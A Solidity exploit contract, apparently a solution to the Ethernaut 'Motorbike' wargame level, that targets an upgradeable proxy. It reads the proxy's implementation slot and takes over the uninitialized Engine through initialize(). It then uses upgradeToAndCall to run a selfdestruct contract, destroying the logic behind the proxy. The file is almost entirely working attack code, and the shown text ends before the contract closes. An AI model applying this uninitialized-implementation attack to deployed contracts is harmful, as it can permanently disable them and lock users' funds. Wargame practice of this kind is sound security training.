// SPDX-License-Identifier: Unlicense
pragma experimental ABIEncoderV2;
pragma solidity <0.7.0;

import "../../src/Motorbike/Motorbike.sol";

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable;
}

contract MaliciousContract {
    function killed() external {
        selfdestruct(address(0));
    }
}

contract MotorbikeExploit {

    Motorbike motorbike;
    MaliciousContract malicious;

    constructor(address _victim) public {
        motorbike = Motorbike(payable(_victim));
        malicious = new MaliciousContract();
    }

    function hack() public {
        // Get the implementation (Engine) address from the storage slot of the Motorbike proxy
        bytes32 IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        address engineAddress;
        assembly {
            engineAddress := sload(IMPLEMENTATION_SLOT)
        }

        // Cast the Engine address to the IEngine interface
        IEngine engine = IEngine(engineAddress);

        // Call initialize() on the Engine to set ourselves as the upgrader
        engine.initialize();

        // Prepare data to call the killed() function
        bytes memory data = abi.encodeWithSignature("killed()");

        // Call upgradeToAndCall() on the Engine, pointing to our malicious contract
        engine.upgradeToAndCall(address(malicious), data);
    }

    receive() external payable {}